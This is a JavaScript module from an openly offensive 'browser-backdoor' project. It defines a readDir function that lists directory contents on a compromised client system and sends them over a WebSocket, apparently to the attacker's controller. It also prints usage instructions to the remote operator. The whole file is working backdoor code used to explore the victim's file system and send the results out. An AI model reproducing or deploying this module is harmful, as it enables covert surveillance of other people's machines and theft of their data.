// INTERACTIVE
/**
 * @file readDir Module
 * @summary Lists all files in a directory on the client system.
 * @author IMcPwn 
 * @see https://github.com/IMcPwn/browser-backdoor
 * @license MIT
 * @version 0.1
 */

fs = require('fs');

/**
 * @param {String} fullPath - The full path of the directory to read from.
 * @return {String} |error|
 * @return {String} Files in directory
 */
readDir = function (fullPath) {
    fs.readdir(fullPath, 'utf8', function (err, data) {
        if (err) {
            ws.send("Error: " + err.toString());
            return;
        }
        ws.send(data);
    });
}

ws.send("\nUsage: readDir(fullPath)\n- fullPath is the properly escaped full path of the directory.");
